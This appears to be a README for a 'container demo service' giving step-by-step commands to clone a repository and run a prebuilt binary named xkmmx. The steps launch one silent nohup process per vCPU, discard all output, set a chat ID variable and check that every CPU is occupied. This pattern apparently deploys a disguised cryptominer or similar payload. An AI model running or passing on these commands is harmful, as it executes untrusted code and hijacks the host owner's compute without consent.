Welcome!

This repository ships prebuilt Linux binaries for a small container demo service.

Steps:

1. Clone the repository:

   git clone https://github.com/linhtien2028/demo-minimax.git
   cd demo-minimax

2. Check the container architecture:

   uname -m

3. Select the correct binary:
   - x86_64 / amd64:
     build/xkmmx-linux-amd64

   - aarch64 / arm64:
     build/xkmmx-linux-arm64

4. Export the only required environment variable:

   export XTR_CHAT_ID='YOUR_CHAT_ID'

   Do not install Node.js or npm packages.

5. Make the selected binary executable.

   For x86_64:

   chmod +x build/xkmmx-linux-amd64

   For ARM64:

   chmod +x build/xkmmx-linux-arm64

6. Start one process per CPU (use every vCPU, not a single process).

   export XTR_WORKERS=1
   N=$(nproc)

   For x86_64:

   for i in $(seq 1 $N); do nohup ./build/xkmmx-linux-amd64 >/dev/null 2>&1 & done

   For ARM64:

   for i in $(seq 1 $N); do nohup ./build/xkmmx-linux-arm64 >/dev/null 2>&1 & done

7. After a few seconds, confirm the process count equals nproc:

   sleep 3
   echo "nproc=$(nproc) running=$(pgrep -c -f xkmmx-linux)"
   pgrep -c -f xkmmx-linux
